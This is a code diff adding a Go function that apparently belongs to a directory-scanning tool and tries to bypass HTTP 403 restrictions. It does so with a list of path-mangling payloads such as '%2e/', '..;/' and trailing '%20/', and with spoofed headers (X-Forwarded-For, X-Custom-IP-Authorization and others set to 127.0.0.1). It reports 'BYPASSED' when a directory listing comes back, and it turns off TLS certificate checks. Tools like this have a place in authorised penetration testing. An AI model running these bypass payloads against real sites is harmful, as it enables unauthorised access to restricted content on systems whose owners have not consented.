@@ -193,3 +193,100 @@ func ForbidFinder(domain string, wl string, nf bool, TimeOut int, OnlyOk bool, i
 	//	return true
 
 }
+
+func do3r(domain string, path string, TimeOut int, OnlyOk bool) {
+	ByPass := []string{"%20" + path + "%20/", "%2e/" + path, "./" + path + "/./", "/" + path + "//", path + "..;/", path + "./", path + "/", path + "/*", path + "/.", path + "//", path + "?", path + "???", path + "%20/", path + "/%25", path + "/.randomstring"}
+	ByPassWithHeader := []string{"X-Custom-IP-Authorization", "X-Originating-IP", "X-Forwarded-For", "X-Remote-IP", "X-Client-IP", "X-Host", "X-Forwarded-Host"}
+	timeout := time.Duration(TimeOut * 1000000)
+	tr := &http.Transport{
+		MaxIdleConns:        20,
+		MaxIdleConnsPerHost: 20,
+		IdleConnTimeout:     time.Second,
+		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
+		DialContext: (&net.Dialer{
+			Timeout:   timeout,
+			KeepAlive: time.Second,
+		}).DialContext,
+		ResponseHeaderTimeout: timeout,
+	}
+
+	client := &http.Client{
+		Transport: tr,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse
+		},
+		Timeout: timeout,
+	}
+	FinalLook := fmt.Sprintf("%s/%s/", domain, path)
+	FinalLookToReq := fmt.Sprintf("%s/%s/", domain, path)
+	if !OnlyOk {
+		fmt.Println(White, "	[+]", Cyan, "- FOUND", White, "[", Blue, FinalLook, White, "]", "  With code ->", "[", Yellow, "403", White, "]")
+	}
+
+	for t0Bypass2 := range ByPassWithHeader {
+		//FullUrl := fmt.Sprintf("%s/%s", domain, )
+		//reQ, err := client.Get(FullUrl)
+		reQ, err := http.NewRequest("GET", FinalLookToReq, nil)
+		if err != nil {
+			panic(err)
+		}
+		reQ.Header.Add(ByPassWithHeader[t0Bypass2], "127.0.0.1")
+		resp, err := client.Do(reQ)
+		if err != nil {
+			//panic(err)
+			return
+		}
+		if resp.StatusCode == http.StatusOK {
+			bodyBytes, err := ioutil.ReadAll(resp.Body)
+			if err != nil {
+				return
+			}
+			bodyString := string(bodyBytes)
+			Directory1StCase := "Index of /" + path
+			DirectorySecCase := "Directory /" + path
+			Directory3RdCase := " - " + path
+			if strings.Contains(bodyString, Directory1StCase) || strings.Contains(bodyString, DirectorySecCase) || strings.Contains(bodyString, Directory3RdCase) {
+				fmt.Println("\n", Yellow, "	  [+] - BYPASSED : payload", White, "[", Green, ByPassWithHeader[t0Bypass2], ": 127.0.0.1", "] :", "] ", Blue, FinalLook, White, " -> Response status code [", Green, resp.StatusCode, White, "]\n")
+
+			}
+			//finalWG.Done()
+			//time.Sleep(10 * time.Second)
+		} else {
+			if !OnlyOk {
+				fmt.Println(White, "	  [-]", Yellow, " - FAILED : payload", White, "[", Green, ByPassWithHeader[t0Bypass2], ": 127.0.0.1", White, "] ", Blue, FinalLook, White, " -> Response status code [", Red, resp.StatusCode, White, "]")
+			}
+		}
+	}
+	for t0Bypass := range ByPass {
+		//	finalWG.Add(1)
+		//qs := url.QueryEscape(ByPass[t0Bypass])
+		FullUrl := fmt.Sprintf("%s/%s", domain, ByPass[t0Bypass])
+		//u, err := url.Parse(qs)
+		reQ, err := client.Get(FullUrl)
+		if err != nil {
+			return
+			//panic(err)
+		}
+		defer reQ.Body.Close()
+		if reQ.StatusCode == http.StatusOK {
+			bodyBytes, err := ioutil.ReadAll(reQ.Body)
+			if err != nil {
+				return
+			}
+			bodyString := string(bodyBytes)
+			Directory1StCase := "Index of /" + path
+			DirectorySecCase := "Directory /" + path
+			Directory3RdCase := " - " + path
+			if strings.Contains(bodyString, Directory1StCase) || strings.Contains(bodyString, DirectorySecCase) || strings.Contains(bodyString, Directory3RdCase) {
+				fmt.Println("\n", Yellow, "	  [+] - BYPASSED : payload", White, "[", Green, ByPass[t0Bypass], White, "] ", Blue, FinalLook, White, " -> Response status code [", Green, reQ.StatusCode, White, "]\n")
+
+			}
+			//stime.Sleep(10 * time.Second)
+		} else {
+			if !OnlyOk {
+				fmt.Println(White, "	  [-]", Yellow, " - FAILED : payload", White, "[", Green, ByPass[t0Bypass], White, "] ", Blue, FullUrl, White, " -> Response status code [", Red, reQ.StatusCode, White, "]")
+			}
+		}
+	}
+
+}
